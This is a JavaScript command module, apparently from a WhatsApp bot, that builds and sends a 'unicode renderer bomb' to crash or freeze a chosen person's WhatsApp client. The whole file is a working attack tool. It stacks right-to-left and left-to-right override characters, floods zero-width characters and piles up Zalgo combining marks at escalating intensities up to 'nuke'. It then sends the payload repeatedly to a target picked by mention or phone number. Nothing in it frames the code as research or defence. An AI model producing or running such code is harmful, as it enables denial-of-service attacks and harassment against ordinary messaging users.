// lang: JavaScript, file: commands/bugcrush.js
// Sends unicode renderer bomb to crash/freeze target's WA client
// Techniques: RTL/LTR direction stack, zero-width flood, Zalgo combining stack

import { CONFIG } from '../config.js';
import { getMentions, numToJid, sleep, jitter, reply } from '../lib/utils.js';

// ── unicode constants ──────────────────────────────────────────────────────────
const RTL        = '\u202E';
const LTR        = '\u202D';
const ZWJ        = '\u200D';
const ZWNJ       = '\u200C';
const ZWSP       = '\u200B';
const BIDI_EMBED = '\u202B';
const BIDI_POP   = '\u202C';
const SOFT_HYP   = '\u00AD';
const WORD_JOIN  = '\u2060';

const COMBINING = [
  '\u0300','\u0301','\u0302','\u0303','\u0304',
  '\u0305','\u0306','\u0307','\u0308','\u0309',
  '\u030A','\u030B','\u030C','\u030D','\u030E',
  '\u0310','\u0311','\u0312','\u0313','\u0314',
  '\u031A','\u031B','\u033D','\u033E','\u033F',
  '\u0340','\u0341','\u0342','\u0343','\u0344',
];

// ── payload builders ───────────────────────────────────────────────────────────

function buildDirectionStack(depth) {
  let out = '';
  for (let i = 0; i < depth; i++) {
    out += (i % 2 === 0 ? RTL : LTR);
    out += BIDI_EMBED;
    if (i % 3 === 0) out += BIDI_POP;
    if (i % 7 === 0) out += ZWJ + ZWNJ;
  }
  return out;
}

function buildZeroWidthFlood(count) {
  const chars = [ZWSP, ZWJ, ZWNJ, WORD_JOIN, SOFT_HYP];
  let out = '';
  for (let i = 0; i < count; i++) out += chars[i % chars.length];
  return out;
}

function buildZalgoStack(stackHeight) {
  let out = '\u200B'; // invisible base char
  for (let i = 0; i < stackHeight; i++) out += COMBINING[i % COMBINING.length];
  return out;
}

function buildPayload(intensity) {
  const levels = {
    low:    { dir: 1000,  zw: 2000,  zalgo: 100, repeat: 1  },
    medium: { dir: 5000,  zw: 8000,  zalgo: 300, repeat: 3  },
    high:   { dir: 10000, zw: 15000, zalgo: 500, repeat: 5  },
    nuke:   { dir: 20000, zw: 30000, zalgo: 800, repeat: 10 },
  };

  const cfg = levels[intensity] || levels.medium;
  let payload = '';

  for (let r = 0; r < cfg.repeat; r++) {
    payload += buildDirectionStack(cfg.dir);
    payload += buildZeroWidthFlood(cfg.zw);
    payload += buildZalgoStack(cfg.zalgo);
  }

  return ' ' + payload + ' ';
}

// ── handler ────────────────────────────────────────────────────────────────────

export async function handleBugCrush(sock, msg, args, jid, sender) {
  const mentions   = getMentions(msg);
  const intensities = ['low', 'medium', 'high', 'nuke'];

  let target    = jid;
  let intensity = 'medium';
  let count     = 1;
  let delay     = 800;
  let idx       = 0;

  // target
  if (mentions.length > 0) {
    target = mentions[0];
    idx++;
  } else if (args[idx] && /^\d+$/.test(args[idx])) {
    target = numToJid(args[idx]);
    idx++;
  }

  // intensity
  if (intensities.includes(args[idx])) {
    intensity = args[idx++];
  }

  // count
  if (args[idx] && !isNaN(args[idx])) {
    count = Math.min(parseInt(args[idx++]), CONFIG.BUG_SPAM_MAX);
  }

  // delay
  if (args[idx] && !isNaN(args[idx])) {
    delay = Math.max(parseInt(args[idx++]), CONFIG.SPAM_DELAY_FLOOR);
  }

  const payload = buildPayload(intensity);

  for (let i = 0; i < count; i++) {
    await sock.sendMessage(target, { text: payload });
    if (i < count - 1) await sleep(jitter(delay));
  }
}
